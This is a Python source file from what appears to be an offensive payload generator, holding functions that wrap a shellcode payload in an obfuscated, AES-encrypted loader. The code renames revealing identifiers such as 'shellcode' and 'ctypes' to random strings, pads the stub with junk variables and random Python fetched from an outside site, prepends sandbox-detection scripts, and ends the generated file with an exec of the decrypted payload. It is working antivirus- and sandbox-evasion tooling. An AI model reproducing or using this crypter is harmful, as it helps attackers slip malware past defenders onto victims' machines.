import Crypto.Cipher.AES as AES
import os
import random
import string
import requests
import re
import blessed
import lxml.html
#add import
import codecs

t = blessed.Terminal()

def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))

def randomJunk():
    newString = ''
    for i in range(random.randint(1, 10)):
        newString += ''.join(random.sample(string.ascii_lowercase, random.randint(1, 26)))
    return newString

def getSandboxScripts(sandboxLang='python'):
    sandboxScripts = ''
    from lib.menu import sandboxMenuOptions
    for i in sandboxMenuOptions:
        if sandboxMenuOptions[str(i)]['availablemodules']:
            payloadChoice = sandboxMenuOptions[str(i)]['payloadchoice']
            if sandboxLang == 'python':
                sandboxContent = open('lib/sandbox/python/' + payloadChoice + '.py', 'r').read()
            elif sandboxLang == 'powershell':
                sandboxContent = open('lib/sandbox/powershell/' + payloadChoice + '.ps1', 'r').read()

            rex = re.search('\*([^\*]*)\*.*\$([^\*]..*)\$', sandboxContent) # Regex is ugly pls help
            if rex:
                originalString, scriptVariable, variableValue = rex.group(), rex.group(1), rex.group(2)
                setVariable = input(t.bold_green + '\n[!] {} Sandbox Script Configuration:\n'.format(payloadChoice) + t.bold_red + '[*] {}? [{}]:'.format(scriptVariable, variableValue)  + t.normal)
                if setVariable:
                    try:
                        int(setVariable)
                    except:
                        setVariable = "'{}'".format(setVariable)
                    variableValue = setVariable
                newString = scriptVariable + ' = ' + variableValue
                sandboxContent = sandboxContent.replace(originalString, newString)
            sandboxScripts += sandboxContent
    return sandboxScripts


def do_Encryption(payload):
    counter = os.urandom(16)
    key = os.urandom(32)

    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()
    randdecrypt = randomJunk()
    randshellcode = randomJunk()
    randbuf = randomJunk()
    randptr = randomJunk()
    randht = randomJunk()
    randctypes = randomJunk()
    randaes = randomJunk()

    try:

        rawHTML = lxml.html.parse('http://www.4geeks.de/cgi-bin/webgen.py').getroot()
        for pre in rawHTML.cssselect('pre'):
            randomPython = pre.text_content()

    except:
        print(t.bold_red + '[!] No network Connection, random python not generated.' + t.normal)
        randomPython = 'if __name__ == \'__main__\':'


    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode).replace('bufe', randbuf).replace('ptr', randptr).replace('ht',randht))

    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
    newpayload += getSandboxScripts('python')
    newpayload += randomPython
    newpayload += "\n\t%s = '%s'\n"% (randomVar(), randomJunk())
    #Change encoding hex to work with python3
    newpayload += "\t%s = '%s'.decode('hex') \n" % (randkey, key.hex())
    #Change encoding hex to work with python3
    newpayload += "\t%s = '%s'.decode('hex') \n" % (randcounter, counter.hex())
    newpayload += "\t%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "\t%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
    #Change encoding hex to work with python3
    newpayload += "\t%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.hex())
    newpayload += "\texec(%s)" % (randcipher)
    return newpayload
